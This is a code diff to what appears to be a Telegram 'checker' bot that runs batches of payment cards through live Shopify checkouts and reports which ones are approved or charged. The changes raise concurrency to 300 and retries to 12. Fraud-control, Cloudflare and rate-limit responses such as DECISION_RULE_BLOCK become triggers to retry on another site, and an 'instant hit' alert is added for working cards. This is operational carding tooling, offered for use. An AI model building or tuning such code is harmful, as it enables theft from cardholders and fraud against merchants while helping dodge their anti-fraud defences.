@@ -1906,7 +1906,6 @@ async def mtxt(event):
     ACTIVE_MTXT_PROCESSES[user_id] = True
     asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy()))
 
-# === REPLACE process_mtxt_cards ===
 async def process_mtxt_cards(event, cards, local_sites):
     user_id = event.sender_id
     total = len(cards)
@@ -1918,10 +1917,13 @@ async def process_mtxt_cards(event, cards, local_sites):
     status_msg = await event.reply(f"```🔥 𝙈𝙏𝙓𝙏 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 🍳 {total} 𝘾𝘾𝙎```")
 
     bin_cache = {}
-    semaphore = asyncio.Semaphore(80)  # FASTER
+    semaphore = asyncio.Semaphore(300)  # 300 THREADS MAX - ADDED FOR FULL POWER
 
-    RETRY_TRIGGERS = ["merchandise_expected_price_mismatch", "unable to get payment token", "validation_custom", "invalid json response", "delivery_delivery_line_detail_changed", "status: 401", "site error", "no working site found", "products", "cloudflare", "bypass failed", "expecting value", "json", "401", "positive_amount_expected", "rate limit", "too many requests", "429", "403", "timeout", "site requires login", "site not supported", "cart failed with status 503", "connection error", "failed to get session token", "payment method not available", "invalid_payment_method", "<b>Site Error! Status: 402</b>", "delivery_address", "<b>not shopify!</b>", "no valid payment method found", "processing_error", "Cart failed with status 422", "payments_payment_flexibility_terms_id_mismatch", "SITE DEAD", "site dead", "<b>Site Error! Status: 429</b>", "proxy error: 503",
-"service unavailable", "Cart failed with status 400", "<b>Proxy Error: Server disconnected</b>", "error:"]
+    RETRY_TRIGGERS = ["merchandise_expected_price_mismatch", "unable to get payment token", "validation_custom", "invalid json response", "delivery_delivery_line_detail_changed", "status: 401", "site error", "no working site found", "products", "cloudflare", "bypass failed", "expecting value", "json", "DECISION_RULE_BLOCK", "401", "positive_amount_expected", "rate limit", "too many requests", "429", "403", "timeout", "site requires login", "site not supported", "cart failed with status 503", "connection error", "failed to get session token", "payment method not available", "invalid_payment_method", "<b>Site Error! Status: 402</b>", "delivery_address", "<b>not shopify!</b>", "no valid payment method found", "processing_error", "Cart failed with status 422", "payments_payment_flexibility_terms_id_mismatch", "SITE DEAD", "site dead", "<b>Site Error! Status: 429</b>", "proxy error: 503",
+"service unavailable", "Cart failed with status 400", "<b>Proxy Error: Server disconnected</b>", "error:", "<b>Site Error! Status: 503</b>",  "<b>Site Error! Status: 401</b>"]
+
+    # ADDED: Hit tracker to guarantee zero missed results
+    hit_cards = set()
 
     async def check_single_card(card):
         nonlocal checked, approved, charged, declined
@@ -1929,7 +1931,7 @@ async def process_mtxt_cards(event, cards, local_sites):
             return
 
         attempts = 0
-        max_attempts = 8
+        max_attempts = 12  # ADDED: Higher attempts for maximum coverage
         sites_tried = set()
 
         while attempts < max_attempts:
@@ -2003,6 +2005,14 @@ async def process_mtxt_cards(event, cards, local_sites):
                         if "CHARGED" in status_header:
                             await pin_charged_message(event, result_msg)
 
+                    # ADDED: Extra forced hit delivery block - zero miss guarantee
+                    if is_hit and card not in hit_cards:
+                        hit_cards.add(card)
+                        try:
+                            await event.reply(f"🚀 INSTANT HIT CONFIRM: {status_header} | {card[:12]}****")
+                        except:
+                            pass
+
                     # Live Status
                     price = result.get("Price", "N/A")
                     try:
@@ -2017,7 +2027,7 @@ async def process_mtxt_cards(event, cards, local_sites):
 
                     status_text = f"""💳 `{card[:12]}****`
 ╭────────────────────
-├ ```📩 Resp ➜ {result.get('Response')}```
+├  ```📩 Resp ➜ {result.get('Response')}```
 ├ 💲 {price} 
 ├ 💎 Charged ➜ {charged}
 ├ ✅ Approved ➜ {approved}
